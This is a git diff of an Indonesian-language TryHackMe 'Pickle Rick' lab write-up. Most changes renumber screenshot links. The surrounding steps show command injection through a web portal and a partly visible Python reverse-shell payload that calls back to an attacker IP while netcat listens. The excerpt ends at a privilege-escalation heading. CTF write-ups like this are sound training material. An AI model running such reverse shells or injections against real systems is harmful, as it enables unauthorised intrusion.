@@ -73,14 +73,15 @@ password: Wubbalubbadubdub
 - Lakukan login ke halaman `http://<IP_machine>/login.php` dengan username dan password yang ditemukan diatas
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%206.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%207.JPG)
 
 - Jika kita ketik `ls` lalu tekan Execute maka diperoleh daftar file sebagai berikut
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%207.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%208.JPG)
 
 - Jika kita ketik `cat Sup3rS3cretPick13Ingred.txt` lalu tekan Execute maka muncul pesan bahwa perintah tersebut telah di block
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%208.JPG) 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%209.JPG) 
 
 - Gunakan Payload berikut untuk masuk ke server. Ganti **10.8.142.62** dengan IP tun0 pada komputer yang anda gunakan
 ```sh
@@ -89,21 +90,23 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 - Buka terminal dan jalankan netcat dengan printah `nc -lnvp <port>`
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%209.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)
 
 - Copy payload dan paste ke halaman `http://<IP_machine>/portal.php` lalu tekan Execute
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)
 
 - Netcat berhasil terkoneksi dan masuk sebagai user **www-data**
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2012.JPG)
 
 - Disini kita bisa membaca file **Sup3rS3cretPick13Ingred.txt** dengan perintah `cat Sup3rS3cretPick13Ingred.txt` yang sebelumnya diblock
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2012.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2013.JPG)
 
-- Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**. Buka file tersebut dengan perintah `cat 'second ingredients'` 
+- Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**. Buka file tersebut dengan perintah `cat 'second ingredients'`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2014.JPG)
 
 ## Privilege Escalation
 - Untuk menemukan final ingredient diperlukan akses user root. Jalankan 2 baris perintah ini untuk memperoleh akses user root
